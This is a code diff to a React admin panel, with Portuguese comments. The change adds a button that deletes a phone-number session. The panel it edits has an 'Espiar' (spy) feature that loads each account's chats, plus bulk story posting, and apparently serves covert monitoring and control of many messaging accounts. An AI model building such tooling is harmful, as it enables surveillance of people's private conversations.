@@ -43,7 +43,6 @@ export default function AdminPanel() {
       
       if (res.ok && data.success) {
         setIsAuthenticated(true);
-        // Só carrega os dados DEPOIS de logar
         fetchData(); 
       } else {
         setLoginError('Acesso Negado.');
@@ -71,6 +70,33 @@ export default function AdminPanel() {
     const newSet = new Set(selectedPhones);
     if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
     setSelectedPhones(newSet);
+  };
+
+  // --- FUNÇÃO DE EXCLUSÃO (NOVO) ---
+  const handleDelete = async (phone) => {
+      if (!confirm(`Tem certeza que deseja apagar a conta ${phone} do painel? Essa ação é irreversível.`)) return;
+      
+      try {
+          const res = await fetch('/api/delete-session', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({ phone })
+          });
+          
+          if (res.ok) {
+              addLog(`🗑️ Conta ${phone} removida.`);
+              // Remove da lista visualmente
+              setSessions(prev => prev.filter(s => s.phone_number !== phone));
+              // Remove dos selecionados se estiver lá
+              if (selectedPhones.has(phone)) toggleSelect(phone);
+              // Limpa o espião se for a conta atual
+              if (spyPhone === phone) { setSpyPhone(''); setChats([]); }
+          } else {
+              addLog(`❌ Erro ao deletar ${phone}`);
+          }
+      } catch (e) {
+          addLog(`❌ Erro de conexão ao deletar.`);
+      }
   };
 
   // --- AÇÕES DO SISTEMA ---
@@ -141,9 +167,7 @@ export default function AdminPanel() {
       setProcessing(false); addLog('✅ Stories postados.');
   };
 
-  // --- RENDERIZAÇÃO CONDICIONAL ---
-
-  // 1. TELA DE BLOQUEIO (Se não estiver logado)
+  // --- RENDERIZAÇÃO ---
   if (!isAuthenticated) {
     return (
       <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#0d1117', fontFamily: 'monospace' }}>
@@ -164,7 +188,6 @@ export default function AdminPanel() {
     );
   }
 
-  // 2. PAINEL ADMIN (Se estiver logado)
   return (
     <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
       
@@ -259,15 +282,25 @@ export default function AdminPanel() {
         <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
             <h3>Contas ({sessions.length})</h3>
             {sessions.map(s => (
-                <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', padding: '8px', background: '#21262d', marginBottom: '5px', borderRadius: '4px', border: selectedPhones.has(s.phone_number) ? '1px solid #238636' : 'none' }}>
+                <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px', background: '#21262d', marginBottom: '5px', borderRadius: '4px', border: selectedPhones.has(s.phone_number) ? '1px solid #238636' : 'none' }}>
                     <span style={{fontSize: '13px'}}>{s.phone_number}</span>
-                    {tab === 'spy' ? (
-                        <button onClick={() => loadChats(s.phone_number)} style={{ background: '#8957e5', border: 'none', color: 'white', cursor: 'pointer', padding: '2px 8px', borderRadius: '2px' }}>Espiar</button>
-                    ) : (
-                        <button onClick={() => toggleSelect(s.phone_number)} style={{ background: selectedPhones.has(s.phone_number) ? '#238636' : '#30363d', border: 'none', color: 'white', cursor: 'pointer', padding: '2px 8px', borderRadius: '2px' }}>
-                           {selectedPhones.has(s.phone_number) ? '✓' : '+'}
+                    <div style={{display:'flex', gap:'5px'}}>
+                        {tab === 'spy' ? (
+                            <button onClick={() => loadChats(s.phone_number)} style={{ background: '#8957e5', border: 'none', color: 'white', cursor: 'pointer', padding: '4px 8px', borderRadius: '2px', fontSize:'11px' }}>Espiar</button>
+                        ) : (
+                            <button onClick={() => toggleSelect(s.phone_number)} style={{ background: selectedPhones.has(s.phone_number) ? '#238636' : '#30363d', border: 'none', color: 'white', cursor: 'pointer', padding: '4px 8px', borderRadius: '2px', fontSize:'11px' }}>
+                               {selectedPhones.has(s.phone_number) ? '✓' : '+'}
+                            </button>
+                        )}
+                        {/* Botão de Excluir */}
+                        <button 
+                            onClick={() => handleDelete(s.phone_number)} 
+                            style={{ background: '#ff5c5c', border: 'none', color: 'white', cursor: 'pointer', padding: '4px 8px', borderRadius: '2px', fontSize:'11px' }}
+                            title="Excluir Conta"
+                        >
+                            🗑️
                         </button>
-                    )}
+                    </div>
                 </div>
             ))}
         </div>
